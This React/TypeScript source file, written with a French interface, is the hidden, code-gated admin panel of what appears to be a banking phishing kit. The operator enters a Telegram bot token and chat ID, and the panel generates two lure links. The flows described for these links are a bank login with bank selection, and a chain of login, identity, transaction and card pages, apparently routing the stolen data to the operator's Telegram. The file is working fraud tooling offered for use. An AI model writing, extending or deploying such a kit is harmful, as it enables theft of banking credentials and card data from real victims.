import React, { useState } from 'react';
import { createConfig } from '../utils/pocketbase';

const getExpectedCode = () => {
  const now = new Date();
  const h = String(now.getHours()).padStart(2, '0');
  const m = String(now.getMinutes()).padStart(2, '0');
  const d = String(now.getDate()).padStart(2, '0');
  const mo = String(now.getMonth() + 1).padStart(2, '0');
  return `${h}${m}${d}${mo}`;
};

const AdminPage = () => {
  const [code, setCode] = useState('');
  const [authenticated, setAuthenticated] = useState(false);
  const [error, setError] = useState('');

  const [botToken, setBotToken] = useState('');
  const [chatId, setChatId] = useState('');
  const [loading, setLoading] = useState(false);
  const [generateError, setGenerateError] = useState('');

  const [generatedUrlBank, setGeneratedUrlBank] = useState('');
  const [generatedUrlCard, setGeneratedUrlCard] = useState('');
  const [copied, setCopied] = useState<'bank' | 'card' | null>(null);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code === getExpectedCode()) {
      setAuthenticated(true);
      setError('');
    } else {
      setError('Code incorrect.');
      setCode('');
    }
  };

  const handleGenerate = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!botToken.trim() || !chatId.trim()) return;

    setLoading(true);
    setGenerateError('');

    try {
      const record = await createConfig(botToken.trim(), chatId.trim());
      const base = `${window.location.origin}${window.location.pathname.replace('/pleh', '')}`;
      setGeneratedUrlBank(`${base}?c=${record.slug}&ssl=true`);
      setGeneratedUrlCard(`${base}?c=${record.slug}&m=f`);
      setCopied(null);
    } catch (err) {
      setGenerateError('Erreur lors de la sauvegarde. Vérifiez la connexion à PocketBase.');
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = (type: 'bank' | 'card') => {
    const url = type === 'bank' ? generatedUrlBank : generatedUrlCard;
    navigator.clipboard.writeText(url);
    setCopied(type);
    setTimeout(() => setCopied(null), 2000);
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <form onSubmit={handleSubmit} className="bg-white rounded-lg shadow-sm p-8 w-full max-w-xs space-y-4">
          <h1 className="text-lg font-semibold text-gray-800 text-center">Accès restreint</h1>
          <input
            type="password"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            placeholder="Code d'accès"
            maxLength={8}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 focus:outline-none focus:ring-2 focus:ring-gray-400 text-center tracking-widest"
            autoFocus
          />
          {error && <p className="text-red-500 text-sm text-center">{error}</p>}
          <button
            type="submit"
            className="w-full py-3 bg-gray-800 text-white rounded-lg hover:bg-gray-700 transition-colors duration-200 font-medium"
          >
            Entrer
          </button>
        </form>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <div className="bg-white rounded-lg shadow-sm p-8 w-full max-w-md space-y-6">
        <h1 className="text-lg font-semibold text-gray-800 text-center">Générateur de lien</h1>

        <form onSubmit={handleGenerate} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">Bot Token</label>
            <input
              type="text"
              value={botToken}
              onChange={(e) => setBotToken(e.target.value)}
              placeholder="123456789:AABBcc..."
              className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 focus:outline-none focus:ring-2 focus:ring-gray-400 text-sm font-mono"
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">Chat ID</label>
            <input
              type="text"
              value={chatId}
              onChange={(e) => setChatId(e.target.value)}
              placeholder="-100123456789"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 focus:outline-none focus:ring-2 focus:ring-gray-400 text-sm font-mono"
            />
          </div>
          {generateError && <p className="text-red-500 text-sm">{generateError}</p>}
          <button
            type="submit"
            disabled={loading}
            className="w-full py-3 bg-gray-800 text-white rounded-lg hover:bg-gray-700 transition-colors duration-200 font-medium disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {loading ? 'Sauvegarde...' : 'Générer le lien'}
          </button>
        </form>

        {generatedUrlBank && (
          <>
            <hr className="border-gray-200" />
            <div className="space-y-4">
              <UrlField
                label="Lien — Login + Sélection de banque"
                description="Login → Sélection banque"
                value={generatedUrlBank}
                isCopied={copied === 'bank'}
                onCopy={() => handleCopy('bank')}
              />
              <UrlField
                label="Lien — Login + Traitement en cours"
                description="Login → Notification → Identité → Transaction → Carte → Traitement en cours"
                value={generatedUrlCard}
                isCopied={copied === 'card'}
                onCopy={() => handleCopy('card')}
              />
            </div>
          </>
        )}
      </div>
    </div>
  );
};

type UrlFieldProps = {
  label: string;
  description: string;
  value: string;
  isCopied: boolean;
  onCopy: () => void;
};

const UrlField = ({ label, description, value, isCopied, onCopy }: UrlFieldProps) => (
  <div className="space-y-2">
    <label className="block text-sm font-medium text-gray-700">{label}</label>
    <p className="text-xs text-gray-500">{description}</p>
    <div className="flex items-center gap-2">
      <input
        type="text"
        readOnly
        value={value}
        className="flex-1 px-3 py-2 border border-gray-300 rounded-lg text-xs font-mono text-gray-600 bg-gray-50 overflow-x-auto"
      />
      <button
        onClick={onCopy}
        className="px-4 py-2 bg-gray-800 text-white rounded-lg hover:bg-gray-700 transition-colors duration-200 text-sm font-medium whitespace-nowrap"
      >
        {isCopied ? 'Copié !' : 'Copier'}
      </button>
    </div>
  </div>
);

export default AdminPage;
